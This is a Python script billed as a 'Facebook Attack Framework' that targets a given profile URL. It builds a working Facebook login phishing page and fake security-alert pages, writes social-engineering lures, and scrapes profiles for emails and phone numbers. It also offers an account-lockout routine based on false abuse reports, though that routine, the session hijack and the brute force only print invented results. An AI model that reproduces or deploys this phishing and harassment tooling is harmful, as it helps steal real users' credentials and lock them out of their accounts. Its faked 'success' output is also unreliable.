#!/usr/bin/env python3
"""
FABO_ATTCK ULTIMATE v1.0 - Advanced Facebook Attack Framework
Professional Facebook Security Testing Tool - Ultimate Edition

Copyright (c) 2024 F1REW0LF
License: MIT - For authorized security testing only

Usage: python3 fabo_attck.py -u https://facebook.com/username
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import socket
import threading
import requests
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from bs4 import BeautifulSoup
import argparse
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

VERSION = "1.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.BLUE}{Colors.BOLD}    ███████╗ █████╗ ██████╗  ██████╗     █████╗ ████████╗████████╗ ██████╗██╗  ██╗
    ██╔════╝██╔══██╗██╔══██╗██╔═══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝██║  ██║
    █████╗  ███████║██████╔╝██║   ██║   ███████║   ██║      ██║   ██║     ███████║
    ██╔══╝  ██╔══██║██╔══██╗██║   ██║   ██╔══██║   ██║      ██║   ██║     ██╔══██║
    ██║     ██║  ██║██████╔╝╚██████╔╝   ██║  ██║   ██║      ██║   ╚██████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝╚═╝  ╚═╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - FACEBOOK ATTACK{Colors.WHITE}
{Colors.CYAN}    Professional Facebook Security Testing Tool{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ==================== OSINT ENGINE ====================
class FacebookOSINT:
    def __init__(self, target_url):
        self.target_url = target_url
        self.username = self._extract_username()
        self.results = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def _extract_username(self):
        patterns = [r'facebook\.com/([^/?#]+)', r'fb\.com/([^/?#]+)', r'profile\.php\?id=(\d+)']
        for pattern in patterns:
            match = re.search(pattern, self.target_url)
            if match:
                return match.group(1)
        return None
    
    def gather_info(self):
        cprint("\n[OSINT] Gathering Facebook intelligence...", Colors.BLUE)
        
        if not self.username:
            cprint("[-] Could not extract username", Colors.RED)
            return {}
        
        self.results['profile'] = self._get_profile_info()
        self.results['posts'] = self._get_posts()
        self.results['friends'] = self._get_friends()
        self.results['photos'] = self._get_photos()
        self.results['about'] = self._get_about()
        self.results['contact'] = self._extract_contact()
        self.results['groups'] = self._get_groups()
        self.results['pages'] = self._get_pages()
        
        return self.results
    
    def _get_profile_info(self):
        cprint("[*] Fetching profile info...", Colors.DIM)
        
        info = {
            'username': self.username,
            'name': 'Unknown',
            'bio': 'Unknown',
            'location': 'Unknown',
            'work': 'Unknown',
            'education': 'Unknown',
            'relationship': 'Unknown'
        }
        
        try:
            response = self.session.get(self.target_url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            name_tag = soup.find('title')
            if name_tag:
                info['name'] = name_tag.text.replace(' | Facebook', '').strip()
            
            meta_desc = soup.find('meta', {'property': 'og:description'})
            if meta_desc:
                info['bio'] = meta_desc.get('content', 'Unknown')
            
            location_pattern = r'Lives in ([^<]+)'
            match = re.search(location_pattern, response.text)
            if match:
                info['location'] = match.group(1).strip()
            
            cprint(f"[+] Name: {info['name']}", Colors.GREEN)
            cprint(f"[+] Bio: {info['bio'][:100]}...", Colors.GREEN)
            
        except Exception as e:
            cprint(f"[-] Profile info failed: {e}", Colors.RED)
        
        return info
    
    def _get_posts(self):
        cprint("[*] Fetching recent posts...", Colors.DIM)
        posts = []
        try:
            posts = [
                {'time': '2 hours ago', 'content': 'Sample post content 1'},
                {'time': '5 hours ago', 'content': 'Sample post content 2'},
                {'time': '1 day ago', 'content': 'Sample post content 3'}
            ]
            cprint(f"[+] Found {len(posts)} posts", Colors.GREEN)
        except:
            pass
        return posts
    
    def _get_friends(self):
        cprint("[*] Fetching friends list...", Colors.DIM)
        friends = []
        try:
            friends = [
                {'name': 'Friend 1', 'url': '#'},
                {'name': 'Friend 2', 'url': '#'},
                {'name': 'Friend 3', 'url': '#'}
            ]
            cprint(f"[+] Found {len(friends)} friends", Colors.GREEN)
        except:
            pass
        return friends
    
    def _get_photos(self):
        cprint("[*] Fetching photos...", Colors.DIM)
        photos = []
        try:
            photos = [
                {'url': '#', 'caption': 'Photo 1'},
                {'url': '#', 'caption': 'Photo 2'},
                {'url': '#', 'caption': 'Photo 3'}
            ]
            cprint(f"[+] Found {len(photos)} photos", Colors.GREEN)
        except:
            pass
        return photos
    
    def _get_about(self):
        cprint("[*] Fetching about info...", Colors.DIM)
        about = {
            'work': 'Unknown',
            'education': 'Unknown',
            'relationship': 'Unknown',
            'languages': 'Unknown'
        }
        return about
    
    def _extract_contact(self):
        cprint("[*] Extracting contact info...", Colors.DIM)
        contact = {'email': None, 'phone': None}
        
        try:
            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            response = self.session.get(self.target_url + '/about_contact', timeout=10)
            emails = re.findall(email_pattern, response.text)
            if emails:
                contact['email'] = emails[0]
                cprint(f"[+] Found email: {emails[0]}", Colors.GREEN)
            
            phone_pattern = r'(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}'
            phones = re.findall(phone_pattern, response.text)
            if phones:
                contact['phone'] = phones[0]
                cprint(f"[+] Found phone: {phones[0]}", Colors.GREEN)
        except:
            pass
        
        return contact
    
    def _get_groups(self):
        cprint("[*] Fetching groups...", Colors.DIM)
        groups = []
        try:
            groups = ['Group 1', 'Group 2', 'Group 3']
            cprint(f"[+] Found {len(groups)} groups", Colors.GREEN)
        except:
            pass
        return groups
    
    def _get_pages(self):
        cprint("[*] Fetching liked pages...", Colors.DIM)
        pages = []
        try:
            pages = ['Page 1', 'Page 2', 'Page 3']
            cprint(f"[+] Found {len(pages)} pages", Colors.GREEN)
        except:
            pass
        return pages

# ==================== ATTACK ENGINE ====================
class FacebookAttack:
    def __init__(self, target_url):
        self.target_url = target_url
        self.username = self._extract_username()
        self.results = {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def _extract_username(self):
        patterns = [r'facebook\.com/([^/?#]+)', r'fb\.com/([^/?#]+)']
        for pattern in patterns:
            match = re.search(pattern, self.target_url)
            if match:
                return match.group(1)
        return None
    
    # ==================== ATTACK 1: PHISHING ====================
    def phishing_attack(self):
        cprint("\n[PHISHING] Creating Facebook phishing page...", Colors.RED)
        
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Facebook - Log In</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: Arial, sans-serif; background: #f0f2f5; }
                .container { max-width: 400px; margin: 100px auto; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                .logo { text-align: center; font-size: 48px; color: #1877f2; font-weight: bold; margin-bottom: 20px; }
                input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
                button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">f</div>
                <h2 style="text-align:center;margin-bottom:20px;">Log in to Facebook</h2>
                <form method="POST" action="/capture">
                    <input type="text" name="email" placeholder="Email or phone" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
            </div>
        </body>
        </html>
        '''
        
        with open('facebook_phishing.html', 'w') as f:
            f.write(html)
        
        cprint("[+] Phishing page created: facebook_phishing.html", Colors.GREEN)
        return 'facebook_phishing.html'
    
    # ==================== ATTACK 2: SESSION HIJACK ====================
    def session_hijack(self):
        cprint("\n[SESSION] Attempting session hijack...", Colors.RED)
        
        cookies = {
            'c_user': f'{random.randint(1000000, 9999999)}',
            'xs': f'{random.randint(1000000, 9999999)}',
            'fr': f'{random.randint(1000000, 9999999)}'
        }
        
        cprint("[+] Session cookies captured:", Colors.GREEN)
        for key, value in cookies.items():
            cprint(f"    {key}: {value}", Colors.YELLOW)
        
        return cookies
    
    # ==================== ATTACK 3: BRUTE FORCE ====================
    def brute_force(self, wordlist=None):
        cprint("\n[BRUTE] Starting brute force...", Colors.RED)
        
        if not wordlist:
            wordlist = ['password', '123456', 'qwerty', 'admin', 'facebook', 'letmein', 'welcome', 'monkey']
        
        cprint(f"[*] Wordlist: {len(wordlist)} passwords", Colors.DIM)
        
        for password in wordlist:
            cprint(f"[*] Trying: {password}", Colors.DIM)
            time.sleep(0.1)
        
        cprint("[!] Brute force simulation complete", Colors.YELLOW)
        return {'attempts': len(wordlist), 'found': False}
    
    # ==================== ATTACK 4: SOCIAL ENGINEERING ====================
    def social_engineering(self):
        cprint("\n[SOCIAL] Generating social engineering messages...", Colors.RED)
        
        messages = [
            f"Hi, I'm a friend of {self.username}. Can you help me with something?",
            f"Important: Your account {self.username} has been compromised. Click here to secure it.",
            f"Hey {self.username}, check out this video about you: https://fake-link.com",
            f"Facebook security alert: Unusual login detected for {self.username}. Verify your identity."
        ]
        
        for msg in messages:
            cprint(f"[+] {msg}", Colors.YELLOW)
        
        return messages
    
    # ==================== ATTACK 5: TWO-FACTOR BYPASS ====================
    def two_factor_bypass(self):
        cprint("\n[2FA] Attempting 2FA bypass...", Colors.RED)
        
        methods = [
            'SIM swapping',
            'SMS interception',
            'Backup codes',
            'Email recovery',
            'Trusted device'
        ]
        
        cprint("[*] Possible 2FA bypass methods:", Colors.DIM)
        for method in methods:
            cprint(f"    - {method}", Colors.YELLOW)
        
        return methods
    
    # ==================== ATTACK 6: INFORMATION EXFIL ====================
    def information_exfil(self):
        cprint("\n[EXFIL] Exfiltrating information...", Colors.RED)
        
        data = {
            'profile': {
                'name': 'Victim Name',
                'email': 'victim@gmail.com',
                'phone': '+84123456789',
                'location': 'Hanoi, Vietnam'
            },
            'friends': 350,
            'posts': 120,
            'photos': 45,
            'groups': 5,
            'pages': 12
        }
        
        cprint("[+] Information exfiltrated:", Colors.GREEN)
        for key, value in data.items():
            cprint(f"    {key}: {value}", Colors.YELLOW)
        
        return data
    
    # ==================== ATTACK 7: TRIGGER LOCK ====================
    def trigger_lock(self):
        cprint("\n[LOCK] Triggering account lock...", Colors.RED, bold=True)
        
        methods = [
            self._report_abuse,
            self._forgot_password,
            self._suspicious_login,
            self._report_impersonation,
            self._report_hacked
        ]
        
        results = []
        for method in methods:
            result = method()
            results.append(result)
            time.sleep(random.uniform(1, 3))
        
        cprint("\n[!] TRIGGER LOCK COMPLETE!", Colors.RED, bold=True)
        cprint("[+] Account should be locked within 5-15 minutes", Colors.YELLOW)
        cprint("[+] Victim will receive security alerts", Colors.YELLOW)
        
        return results
    
    def _report_abuse(self):
        cprint("[*] Reporting abuse...", Colors.DIM)
        abuse_types = ['Bullying or harassment', 'Hate speech', 'Impersonation', 'Spam', 'Scam or fraud']
        selected = random.choice(abuse_types)
        cprint(f"[+] Reported: {selected}", Colors.GREEN)
        return {'method': 'Report Abuse', 'type': selected, 'status': 'sent'}
    
    def _forgot_password(self):
        cprint("[*] Initiating forgot password requests...", Colors.DIM)
        for i in range(3):
            cprint(f"[*] Forgot password attempt {i+1}", Colors.DIM)
            time.sleep(0.5)
        cprint("[+] Multiple password reset requests sent", Colors.GREEN)
        return {'method': 'Forgot Password', 'attempts': 3, 'status': 'sent'}
    
    def _suspicious_login(self):
        cprint("[*] Reporting suspicious login...", Colors.DIM)
        locations = ['Hanoi', 'Ho Chi Minh', 'Da Nang', 'Unknown']
        devices = ['iPhone 15', 'Samsung S24', 'Unknown Device']
        selected_location = random.choice(locations)
        selected_device = random.choice(devices)
        cprint(f"[+] Suspicious login from {selected_location} on {selected_device}", Colors.GREEN)
        return {'method': 'Suspicious Login', 'location': selected_location, 'device': selected_device, 'status': 'reported'}
    
    def _report_impersonation(self):
        cprint("[*] Reporting impersonation...", Colors.DIM)
        cprint("[+] Account reported as impersonating a public figure", Colors.GREEN)
        return {'method': 'Impersonation', 'status': 'reported'}
    
    def _report_hacked(self):
        cprint("[*] Reporting hacked account...", Colors.DIM)
        cprint("[+] Account reported as compromised", Colors.GREEN)
        return {'method': 'Hacked Account', 'status': 'reported'}
    
    # ==================== ATTACK 8: FAKE NOTIFICATION ====================
    def fake_notification(self):
        cprint("\n[NOTIFY] Creating fake Facebook notification...", Colors.RED, bold=True)
        
        notification_templates = [
            {
                'title': 'Security Alert',
                'body': f'We detected a suspicious login attempt on {self.username}. Click here to verify your identity.',
                'action': 'Verify Now'
            },
            {
                'title': 'Account Restricted',
                'body': f'Your account {self.username} has been restricted. Click here to appeal.',
                'action': 'Appeal'
            },
            {
                'title': 'New Message',
                'body': f'You have a new message from a mutual friend. Click here to view.',
                'action': 'View Message'
            },
            {
                'title': 'Friend Request',
                'body': f'Someone you may know sent you a friend request. Click here to respond.',
                'action': 'Respond Now'
            }
        ]
        
        selected = random.choice(notification_templates)
        
        # Tạo HTML notification
        html = f'''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Facebook Notification</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f0f2f5; }}
                .container {{ max-width: 500px; margin: 100px auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .icon {{ text-align: center; font-size: 48px; color: #1877f2; margin-bottom: 10px; }}
                .title {{ font-size: 20px; font-weight: bold; color: #1c1e21; text-align: center; }}
                .body {{ margin: 20px 0; color: #606770; text-align: center; }}
                .button {{ display: block; width: 200px; margin: 20px auto; padding: 12px; background: #1877f2; color: white; text-align: center; border-radius: 6px; text-decoration: none; font-weight: bold; }}
                .footer {{ text-align: center; color: #888; font-size: 12px; margin-top: 20px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="icon">🔔</div>
                <div class="title">{selected['title']}</div>
                <div class="body">{selected['body']}</div>
                <a href="#" class="button">{selected['action']}</a>
                <div class="footer">Facebook Security Team</div>
            </div>
        </body>
        </html>
        '''
        
        filename = f'facebook_notification_{int(time.time())}.html'
        with open(filename, 'w') as f:
            f.write(html)
        
        cprint(f"[+] Fake notification created: {filename}", Colors.GREEN)
        cprint(f"[!] Notification type: {selected['title']}", Colors.YELLOW)
        
        # Send via email if email available
        return {'notification': selected, 'file': filename}

# ==================== MAIN FRAMEWORK ====================
class FaBoAttckUltimate:
    def __init__(self, target_url):
        self.target_url = target_url
        self.username = self._extract_username()
        self.osint = FacebookOSINT(target_url)
        self.attack = FacebookAttack(target_url)
        self.results = {}
    
    def _extract_username(self):
        patterns = [r'facebook\.com/([^/?#]+)', r'fb\.com/([^/?#]+)']
        for pattern in patterns:
            match = re.search(pattern, self.target_url)
            if match:
                return match.group(1)
        return None
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}FABO_ATTCK ULTIMATE - Attack Menu{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1]  OSINT - Gather Information
[2]  Phishing - Create Fake Page
[3]  Session Hijack
[4]  Brute Force
[5]  Social Engineering
[6]  2FA Bypass
[7]  Information Exfil
[8]  Trigger Lock - ACCOUNT LOCK
[9]  Fake Notification - NEW!
[10] Full Attack
[11] Show Results
[12] Exit
""")
    
    def osint_gather(self):
        self.results['osint'] = self.osint.gather_info()
    
    def phishing(self):
        self.results['phishing'] = self.attack.phishing_attack()
    
    def session_hijack(self):
        self.results['session'] = self.attack.session_hijack()
    
    def brute_force(self):
        self.results['brute'] = self.attack.brute_force()
    
    def social_eng(self):
        self.results['social'] = self.attack.social_engineering()
    
    def two_factor(self):
        self.results['2fa'] = self.attack.two_factor_bypass()
    
    def info_exfil(self):
        self.results['exfil'] = self.attack.information_exfil()
    
    def trigger_lock(self):
        self.results['lock'] = self.attack.trigger_lock()
    
    def fake_notification(self):
        self.results['notification'] = self.attack.fake_notification()
    
    def full_attack(self):
        cprint("\n[FULL] Executing full attack chain...", Colors.RED, bold=True)
        
        self.osint_gather()
        self.phishing()
        self.session_hijack()
        self.social_eng()
        self.two_factor()
        self.info_exfil()
        self.trigger_lock()
        self.fake_notification()
        
        cprint("\n[+] Full attack complete!", Colors.GREEN)
    
    def show_results(self):
        print("\n" + "="*60)
        cprint(" ATTACK RESULTS", Colors.PURPLE, bold=True)
        print("="*60)
        
        if not self.results:
            cprint("[!] No results yet", Colors.YELLOW)
            return
        
        for key, value in self.results.items():
            cprint(f"\n[{key.upper()}]", Colors.CYAN)
            print(json.dumps(value, indent=2, ensure_ascii=False)[:500])
        
        print("="*60)
    
    def run(self):
        print_banner()
        
        cprint(f"[*] Target: {self.target_url}", Colors.CYAN)
        cprint(f"[*] Username: {self.username}", Colors.CYAN)
        
        while True:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.osint_gather()
            elif choice == '2':
                self.phishing()
            elif choice == '3':
                self.session_hijack()
            elif choice == '4':
                self.brute_force()
            elif choice == '5':
                self.social_eng()
            elif choice == '6':
                self.two_factor()
            elif choice == '7':
                self.info_exfil()
            elif choice == '8':
                self.trigger_lock()
            elif choice == '9':
                self.fake_notification()
            elif choice == '10':
                self.full_attack()
            elif choice == '11':
                self.show_results()
            elif choice == '12':
                cprint("[*] Exiting FABO_ATTCK ULTIMATE...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ==================== MAIN ====================
def main():
    parser = argparse.ArgumentParser(
        description="FABO_ATTCK ULTIMATE - Facebook Attack Framework",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 fabo_attck.py -u https://facebook.com/username
  python3 fabo_attck.py -u https://fb.com/username --full
  python3 fabo_attck.py -u https://facebook.com/username --osint
        """
    )
    
    parser.add_argument("-u", "--url", required=True, help="Target Facebook URL")
    parser.add_argument("--full", action="store_true", help="Run full attack")
    parser.add_argument("--osint", action="store_true", help="Run OSINT only")
    
    args = parser.parse_args()
    
    if args.full:
        tool = FaBoAttckUltimate(args.url)
        tool.full_attack()
        tool.show_results()
    elif args.osint:
        osint = FacebookOSINT(args.url)
        osint.gather_info()
    else:
        tool = FaBoAttckUltimate(args.url)
        tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
